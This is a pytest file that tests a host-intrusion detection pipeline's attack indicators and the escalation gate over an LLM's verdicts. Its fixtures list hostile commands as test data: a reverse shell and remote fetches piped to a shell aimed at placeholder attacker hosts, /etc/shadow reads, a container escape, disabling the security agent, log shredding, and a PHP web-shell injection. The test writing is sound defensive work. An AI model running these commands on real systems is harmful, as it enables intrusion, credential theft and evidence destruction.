"""Tests for the deterministic indicators and the escalation gate.

The corpus pairs read-only inspection that quotes attacker vocabulary against
the mutations that actually compromise a host: the first must match nothing, the
second must match.
"""

import pytest

from src.indicators import (
    DEFAULT_CRITICAL_INDICATORS,
    INDICATOR_PATTERNS,
    match_indicators,
    parse_critical_indicators,
)
from src.pipeline import _apply_escalation_gate, _command_of

# Fetches to a loopback host: local API reads, not downloads from a remote host.
LOOPBACK_FETCHES = [
    "/usr/bin/docker exec prometheus wget -qO- http://localhost:9090/api/v1/query?query=up",
    "curl -s http://127.0.0.1:6333/collections",
    "wget -qO- http://[::1]:9090/metrics",
    "curl -s http://0.0.0.0:8080/health",
]

# Read-only inspection and routine administration, however long the text looks.
BENIGN_COMMANDS = [
    """/usr/bin/bash -c 'WP=/var/www/html/site
echo "=== PHP files inside uploads/ ==="
find $WP/wp-content/uploads -iname "*.php*" 2>/dev/null
echo "=== Suspicious code patterns across the webroot ==="
grep -rIl --include="*.php" -E "eval\\(|base64_decode\\(|shell_exec\\(" $WP | head -50'""",
    """/usr/bin/bash -c 'find /var/www/html -iname "*.php" -mtime -60 """
    """-printf "%TY-%Tm-%Td %p\\n" 2>/dev/null | sort | tail -100'""",
    """/usr/bin/bash -c 'find /var/www/html -name "*.php" -exec md5sum {} \\; | sort'""",
    """/usr/bin/grep -E "downloads/base64|\\.\\./" /var/log/nginx/access.log | tail -200""",
    "/usr/bin/docker ps -a",
    "/usr/bin/systemctl status nginx",
    "/usr/bin/journalctl -u nginx --since '1 hour ago' --no-pager",
]

# Each attack paired with the indicator it must match.
ATTACK_COMMANDS = [
    ("/usr/bin/curl -s http://malicious.example/x.sh | bash", "pipe_to_interpreter"),
    ("/usr/bin/wget -qO- http://malicious.example/i.sh | sh", "remote_fetch"),
    ("/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "raw_socket_redirect"),
    ("/bin/sh -c 'echo ZXhhbXBsZQ== | base64 -d | sh'", "encoded_payload"),
    ("/bin/cat /etc/shadow", "credential_access"),
    ("/usr/bin/systemctl stop wazuh-agent", "security_tooling_disabled"),
    ("/usr/bin/docker run --rm --privileged -v /:/host alpine chroot /host sh",
     "container_escape"),
    ("/usr/sbin/usermod -aG sudo intruder", "privileged_account_config"),
    ("/usr/bin/shred -u /var/log/auth.log", "log_tampering"),
    ("""/usr/bin/bash -c 'find /var/www/html -name "*.php" -exec sed -i """
     """"s|<?php|<?php eval($_POST[0]);|" {} \\;'""", "destructive_file_write"),
    ("""/usr/bin/bash -c 'find /var/log -name "*.log" -mtime +0 -delete'""",
     "destructive_file_write"),
]


@pytest.mark.parametrize("command", BENIGN_COMMANDS)
def test_read_only_activity_matches_no_indicator(command: str) -> None:
    assert match_indicators(command) == []


@pytest.mark.parametrize("command", LOOPBACK_FETCHES)
def test_loopback_fetch_is_not_a_remote_fetch(command: str) -> None:
    assert "remote_fetch" not in match_indicators(command)


@pytest.mark.parametrize("command", [
    "curl -s http://malicious.example/x.sh | bash",
    "wget -qO- https://payload.example/i.sh | sh",
    "curl -o /tmp/p http://203.0.113.5/payload",
])
def test_external_fetch_still_matches_remote_fetch(command: str) -> None:
    assert "remote_fetch" in match_indicators(command)


@pytest.mark.parametrize("command,expected", ATTACK_COMMANDS)
def test_attack_matches_its_indicator(command: str, expected: str) -> None:
    assert expected in match_indicators(command)


@pytest.mark.parametrize("command", BENIGN_COMMANDS)
def test_gate_caps_a_shape_only_anomaly_at_suspicious(command: str) -> None:
    assert _apply_escalation_gate(
        "MALICIOUS", match_indicators(command), DEFAULT_CRITICAL_INDICATORS
    ) == "SUSPICIOUS"


@pytest.mark.parametrize("command,_expected", ATTACK_COMMANDS)
def test_gate_lets_a_confirmed_attack_through(command: str, _expected: str) -> None:
    assert _apply_escalation_gate(
        "MALICIOUS", match_indicators(command), DEFAULT_CRITICAL_INDICATORS
    ) == "MALICIOUS"


def test_gate_never_invents_an_escalation() -> None:
    """Matching an indicator is necessary, not sufficient: the LLM still decides."""
    indicators = match_indicators("/usr/bin/curl -s http://malicious.example/x.sh | bash")
    assert indicators
    for dismissed in ("SUSPICIOUS", "FALSE_POSITIVE"):
        assert _apply_escalation_gate(
            dismissed, indicators, DEFAULT_CRITICAL_INDICATORS
        ) == dismissed


@pytest.mark.parametrize("command", [
    "/usr/bin/systemctl stop wazuh-agent",  # security_tooling_disabled
    "/usr/bin/shred -u /var/log/auth.log",  # log_tampering
    "/bin/cat /etc/shadow",                 # credential_access
])
def test_gate_overrides_a_dismissed_critical_indicator(command: str) -> None:
    assert _apply_escalation_gate(
        "FALSE_POSITIVE", match_indicators(command), DEFAULT_CRITICAL_INDICATORS
    ) == "MALICIOUS"


def test_gate_leaves_non_critical_dismissals_alone() -> None:
    indicators = match_indicators("/usr/bin/apt-get install -y nginx")  # package_management
    assert indicators and not set(indicators) & DEFAULT_CRITICAL_INDICATORS
    assert _apply_escalation_gate(
        "FALSE_POSITIVE", indicators, DEFAULT_CRITICAL_INDICATORS
    ) == "FALSE_POSITIVE"


def test_empty_command_matches_nothing() -> None:
    assert match_indicators("") == []


def test_command_of_reads_the_anomaly_payload() -> None:
    alert = {"data": {"anomaly_detector": {"command": "  /usr/bin/docker ps  "}}}
    assert _command_of(alert) == "/usr/bin/docker ps"


@pytest.mark.parametrize("alert", [{}, {"data": {}}, {"data": {"anomaly_detector": {}}}])
def test_command_of_returns_empty_without_process_telemetry(alert: dict) -> None:
    assert _command_of(alert) == ""


def test_critical_indicators_default_when_unset() -> None:
    assert parse_critical_indicators(None) == DEFAULT_CRITICAL_INDICATORS


def test_critical_indicators_parse_from_a_configured_string() -> None:
    assert parse_critical_indicators("log_tampering, credential_access") == frozenset(
        {"log_tampering", "credential_access"}
    )


def test_unknown_critical_indicator_names_are_dropped() -> None:
    assert parse_critical_indicators("log_tampering,not_a_real_indicator") == frozenset(
        {"log_tampering"}
    )


def test_critical_indicators_are_all_known() -> None:
    assert DEFAULT_CRITICAL_INDICATORS <= set(INDICATOR_PATTERNS)
